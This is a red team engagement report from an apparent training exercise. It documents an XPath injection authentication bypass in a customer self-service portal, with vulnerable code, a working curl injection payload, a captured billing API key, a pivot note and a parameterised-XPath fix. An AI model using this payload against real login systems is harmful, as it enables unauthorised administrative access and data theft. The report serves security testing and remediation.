# Red Team Engagement Report — EXT01-M01
**Operation VAJRA SHAKTI | RNG-EXT-01 | M1-ext-customer-portal**
**Engagement Type:** Purple Team Exercise | **Date:** 2025-11-15 | **Classification:** TRAINING

---

## Executive Summary
The BUNL Customer Self-Service Portal was found to be vulnerable to XPath Injection in the authentication mechanism. An attacker with no prior credentials can bypass authentication entirely and gain administrative access. The admin panel exposes the Billing API integration key used by M2, enabling the next stage of the intrusion chain.

---

## Finding 1: XPath Injection — Authentication Bypass (Critical)
**CWE:** CWE-643 — Improper Neutralisation of Data within XPath Expressions  
**CVSS v3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)  
**MITRE:** T1190

### Vulnerable Code
```python
xpath_expr = f"//users/user[username/text()='{username}' and password/text()='{password}']"
result = root.xpath(xpath_expr)
```
User input is directly interpolated into the XPath expression — no sanitisation or parameterisation.

### Proof of Concept
```bash
# Bypass as admin (role-targeted injection)
curl -c /tmp/sess.txt -X POST http://203.x.x.x:8080/login \
  -d "username=%27+or+role%2Ftext%28%29%3D%27admin%27+or+%271%27%3D%270&password=x" -L | grep "Billing API Key"
```

**Output:** `<code class="text-danger">gql-key-b2f4a8c3e9d1f7b5</code>`

### Impact
- Full authentication bypass — any user role accessible without credentials
- Admin session grants access to all consumer data and system configuration
- Billing API key `gql-key-b2f4a8c3e9d1f7b5` exposed — enables M2 pivot

### Remediation
Use parameterised XPath via lxml's variable binding:
```python
xpath_expr = "//users/user[username/text()=$uname and password/text()=$pwd]"
result = root.xpath(xpath_expr, uname=username, pwd=password)
```

---

## Artifacts
- Vulnerable route: `/opt/bunl/customer-portal/app.py` → `login()` function
- User database: `/opt/bunl/customer-portal/users.xml`
- Access log evidence: `/var/log/bunl/customer-portal/access.log`

---

## Pivot
**M2:** Billing API key `gql-key-b2f4a8c3e9d1f7b5` → GraphQL API on port 4000
